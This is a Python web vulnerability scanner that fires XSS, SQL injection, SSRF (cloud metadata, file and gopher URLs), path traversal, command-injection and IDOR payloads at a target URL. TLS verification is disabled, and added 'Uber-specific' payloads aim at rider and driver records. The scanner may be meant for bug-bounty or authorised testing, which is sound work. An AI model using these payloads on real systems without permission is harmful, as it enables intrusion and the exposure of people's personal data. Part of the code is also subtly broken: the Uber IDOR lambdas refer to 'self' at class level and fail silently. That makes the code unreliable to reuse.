import requests
import time
import re
import urllib.parse
from typing import Dict, List, Optional
import base64
import random
import string
import uuid  # Uber-specific IDOR payloads require uuid

class EnhancedVulnerabilityTester:
    """Enhanced vulnerability testing with actual detection logic"""
    
    def __init__(self, timeout: int = 10, delay: float = 1.0):
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def test_payload(self, url: str, payload_data: Dict) -> Dict:
        """Enhanced payload testing with multiple vulnerability types"""
        vuln_type = payload_data.get('type', '').lower()
        
        # Rate limiting
        time.sleep(self.delay)
        
        try:
            if vuln_type == 'xss':
                return self._test_xss(url, payload_data)
            elif vuln_type == 'sqli':
                return self._test_sql_injection(url, payload_data)
            elif vuln_type == 'ssrf':
                return self._test_ssrf(url, payload_data)
            elif vuln_type == 'lfi':
                return self._test_lfi(url, payload_data)
            elif vuln_type == 'rce':
                return self._test_rce(url, payload_data)
            elif vuln_type == 'idor':
                return self._test_idor(url, payload_data)
            else:
                return {"vulnerable": False, "error": f"Unknown vulnerability type: {vuln_type}"}
                
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
    
    def _test_xss(self, url: str, payload_data: Dict) -> Dict:
        """Test for XSS vulnerabilities"""
        payload = payload_data.get('payload', '')
        parameter = payload_data.get('parameter', 'q')
        
        # Generate unique marker for detection
        marker = ''.join(random.choices(string.ascii_letters, k=8))
        xss_payload = f"<script>alert('{marker}')</script>"
        
        test_cases = [
            xss_payload,
            f'"><script>alert("{marker}")</script>',
            f"'><script>alert('{marker}')</script>",
            f'<img src=x onerror=alert("{marker}")>',
            f'javascript:alert("{marker}")',
            f'<svg onload=alert("{marker}")>',
        ]
        
        for test_payload in test_cases:
            # Test GET parameter
            test_url = f"{url}?{parameter}={urllib.parse.quote(test_payload)}"
            
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Check if payload is reflected without encoding
                if marker in response.text and '<script>' in response.text.lower():
                    return {
                        "vulnerable": True,
                        "type": "Reflected XSS",
                        "url": test_url,
                        "parameter": parameter,
                        "payload": test_payload,
                        "evidence": self._extract_evidence(response.text, marker),
                        "severity": "medium",
                        "confidence": "high"
                    }
                    
                # Test POST parameter
                post_data = {parameter: test_payload}
                response = self.session.post(url, data=post_data, timeout=self.timeout, verify=False)
                
                if marker in response.text and '<script>' in response.text.lower():
                    return {
                        "vulnerable": True,
                        "type": "Reflected XSS (POST)",
                        "url": url,
                        "parameter": parameter,
                        "payload": test_payload,
                        "evidence": self._extract_evidence(response.text, marker),
                        "severity": "medium",
                        "confidence": "high"
                    }
                    
            except requests.RequestException:
                continue
        
        return {"vulnerable": False}
    
    def _test_sql_injection(self, url: str, payload_data: Dict) -> Dict:
        """Test for SQL injection vulnerabilities"""
        parameter = payload_data.get('parameter', 'id')
        
        # SQL injection test payloads
        error_payloads = [
            "'",
            '"',
            "' OR '1'='1",
            '" OR "1"="1',
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' UNION SELECT NULL,@@version,NULL--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1'; WAITFOR DELAY '00:00:05'--"
        ]
        
        # Time-based payloads
        time_payloads = [
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND pg_sleep(5)--",
            "1'||pg_sleep(5)--"
        ]
        
        # Error-based detection
        for payload in error_payloads:
            test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
            
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Check for SQL error messages
                sql_errors = [
                    'sql syntax', 'mysql_fetch', 'mysql_query', 'mysqli_query',
                    'postgresql', 'postgres', 'ora-', 'oracle error',
                    'sqlite_', 'sqlite3', 'mssql', 'sqlserver',
                    'syntax error', 'quoted string not properly terminated',
                    'unterminated quoted string', 'unexpected end of sql command'
                ]
                
                response_lower = response.text.lower()
                for error in sql_errors:
                    if error in response_lower:
                        return {
                            "vulnerable": True,
                            "type": "SQL Injection (Error-based)",
                            "url": test_url,
                            "parameter": parameter,
                            "payload": payload,
                            "evidence": self._extract_evidence(response.text, error),
                            "severity": "high",
                            "confidence": "high"
                        }
                        
            except requests.RequestException:
                continue
        
        # Time-based detection
        for payload in time_payloads:
            test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
            
            try:
                start_time = time.time()
                response = self.session.get(test_url, timeout=15, verify=False)
                elapsed = time.time() - start_time
                
                # If response took significantly longer, likely time-based SQLi
                if elapsed >= 4.5:  # Allow for network latency
                    return {
                        "vulnerable": True,
                        "type": "SQL Injection (Time-based)",
                        "url": test_url,
                        "parameter": parameter,
                        "payload": payload,
                        "evidence": f"Response time: {elapsed:.2f} seconds",
                        "severity": "high",
                        "confidence": "medium"
                    }
                    
            except requests.RequestException:
                continue
        
        return {"vulnerable": False}
    
    def _test_ssrf(self, url: str, payload_data: Dict) -> Dict:
        """Test for SSRF vulnerabilities"""
        parameter = payload_data.get('parameter', 'url')
        
        # SSRF test payloads
        internal_ips = [
            'http://127.0.0.1:80',
            'http://localhost:80',
            'http://169.254.169.254',  # AWS metadata
            'http://metadata.google.internal',  # GCP metadata
            'http://10.0.0.1',
            'http://192.168.1.1',
            'file:///etc/passwd',
            'gopher://127.0.0.1:3306'
        ]
        
        for ssrf_payload in internal_ips:
            test_url = f"{url}?{parameter}={urllib.parse.quote(ssrf_payload)}"
            
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Look for signs of internal service responses
                ssrf_indicators = [
                    'root:x:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
                    'mysql', 'postgresql', 'redis',       # Internal services
                    'apache', 'nginx', 'iis',             # Web servers
                    'aws', 'instance-id', 'ami-id',       # AWS metadata
                    'gcp', 'google', 'metadata'           # GCP metadata
                ]
                
                response_lower = response.text.lower()
                for indicator in ssrf_indicators:
                    if indicator in response_lower:
                        return {
                            "vulnerable": True,
                            "type": "Server-Side Request Forgery (SSRF)",
                            "url": test_url,
                            "parameter": parameter,
                            "payload": ssrf_payload,
                            "evidence": self._extract_evidence(response.text, indicator),
                            "severity": "high",
                            "confidence": "medium"
                        }
                        
            except requests.RequestException:
                continue
        
        return {"vulnerable": False}
    
    def _test_lfi(self, url: str, payload_data: Dict) -> Dict:
        """Test for Local File Inclusion vulnerabilities"""
        parameter = payload_data.get('parameter', 'file')
        
        # LFI test payloads
        lfi_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/etc/passwd',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            'php://filter/read=convert.base64-encode/resource=/etc/passwd'
        ]
        
        for lfi_payload in lfi_payloads:
            test_url = f"{url}?{parameter}={urllib.parse.quote(lfi_payload)}"
            
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Look for file contents
                lfi_indicators = [
                    'root:x:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
                    'localhost', '127.0.0.1',              # hosts file
                    '# Copyright', '# This file'            # Common file headers
                ]
                
                for indicator in lfi_indicators:
                    if indicator in response.text:
                        return {
                            "vulnerable": True,
                            "type": "Local File Inclusion (LFI)",
                            "url": test_url,
                            "parameter": parameter,
                            "payload": lfi_payload,
                            "evidence": self._extract_evidence(response.text, indicator),
                            "severity": "high",
                            "confidence": "high"
                        }
                        
            except requests.RequestException:
                continue
        
        return {"vulnerable": False}
    
    def _test_rce(self, url: str, payload_data: Dict) -> Dict:
        """Test for Remote Code Execution vulnerabilities"""
        parameter = payload_data.get('parameter', 'cmd')
        
        # Generate unique marker
        marker = ''.join(random.choices(string.ascii_letters, k=8))
        
        # RCE test payloads
        rce_payloads = [
            f'echo {marker}',
            f'; echo {marker}',
            f'| echo {marker}',
            f'&& echo {marker}',
            f'`echo {marker}`',
            f'$(echo {marker})',
            f'%7Cecho%20{marker}',  # URL encoded
            f'\\x7cecho\\x20{marker}'  # Hex encoded
        ]
        
        for rce_payload in rce_payloads:
            test_url = f"{url}?{parameter}={urllib.parse.quote(rce_payload)}"
            
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Check if our marker appears in response
                if marker in response.text:
                    return {
                        "vulnerable": True,
                        "type": "Remote Code Execution (RCE)",
                        "url": test_url,
                        "parameter": parameter,
                        "payload": rce_payload,
                        "evidence": self._extract_evidence(response.text, marker),
                        "severity": "critical",
                        "confidence": "high"
                    }
                    
            except requests.RequestException:
                continue
        
        return {"vulnerable": False}
    
    # Uber-specific payloads for enhanced testing
    UBER_SPECIFIC_PAYLOADS = {
        'idor': [
            # UUID variations for Uber's ID format
            '00000000-0000-0000-0000-000000000000',
            'ffffffff-ffff-ffff-ffff-ffffffffffff',
            # Increment/decrement rider IDs (as functions)
            lambda current_id: str(uuid.UUID(int=uuid.UUID(current_id).int + 1)) if self._is_uuid(current_id) else None,
            lambda current_id: str(uuid.UUID(int=uuid.UUID(current_id).int - 1)) if self._is_uuid(current_id) else None,
        ],
        'api_keys': [
            'server_token=',
            'client_id=',
            'uber_api_key=',
            'x-uber-token:',
        ],
        'graphql': [
            'query { user { id email phone rides { id fare } } }',
            'query { driver { id earnings trips { id fare } } }',
        ]
    }

    def _is_uuid(self, val):
        try:
            uuid.UUID(val)
            return True
        except Exception:
            return False
    
    def _test_idor(self, url: str, payload_data: Dict) -> Dict:
        """Test for Insecure Direct Object Reference vulnerabilities"""
        parameter = payload_data.get('parameter', 'id')
        
        # Extract current parameter value
        if '?' in url:
            base_url, query = url.split('?', 1)
            params = urllib.parse.parse_qs(query)
            current_value = params.get(parameter, ['1'])[0]
        else:
            base_url = url
            current_value = '1'
        
        # IDOR test values
        idor_payloads = [
            str(int(current_value) + 1) if current_value.isdigit() else '2',
            str(int(current_value) - 1) if current_value.isdigit() else '0',
            '999999',
            '0',
            '-1',
            'admin',
            'root',
            '1',
            '2'
        ]
        # Add Uber-specific payloads
        for p in self.UBER_SPECIFIC_PAYLOADS['idor']:
            if callable(p):
                try:
                    val = p(current_value)
                    if val and val not in idor_payloads:
                        idor_payloads.append(val)
                except Exception:
                    continue
            else:
                if p not in idor_payloads:
                    idor_payloads.append(p)
        
        # Get baseline response
        try:
            baseline_response = self.session.get(url, timeout=self.timeout, verify=False)
            baseline_length = len(baseline_response.text)
        except:
            return {"vulnerable": False}
        
        for idor_payload in idor_payloads:
            test_url = f"{base_url}?{parameter}={idor_payload}"
            
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Look for different response (potential IDOR)
                length_diff = abs(len(response.text) - baseline_length)
                
                # If response is significantly different and contains user data indicators
                if length_diff > 100 and response.status_code == 200:
                    user_indicators = [
                        'email', 'username', 'profile', 'account',
                        'user_id', 'userid', 'id=', 'name='
                    ]
                    
                    response_lower = response.text.lower()
                    for indicator in user_indicators:
                        if indicator in response_lower:
                            return {
                                "vulnerable": True,
                                "type": "Insecure Direct Object Reference (IDOR)",
                                "url": test_url,
                                "parameter": parameter,
                                "payload": idor_payload,
                                "evidence": f"Response length difference: {length_diff} bytes",
                                "severity": "medium",
                                "confidence": "low"
                            }
                            
            except requests.RequestException:
                continue
        
        return {"vulnerable": False}
    
    def _extract_evidence(self, response_text: str, indicator: str, context_length: int = 200) -> str:
        """Extract evidence context around found indicator"""
        try:
            index = response_text.lower().find(indicator.lower())
            if index == -1:
                return "Evidence found but couldn't extract context"
            
            start = max(0, index - context_length // 2)
            end = min(len(response_text), index + context_length // 2)
            
            context = response_text[start:end]
            return f"...{context}..." if start > 0 or end < len(response_text) else context
        except:
            return "Evidence found"
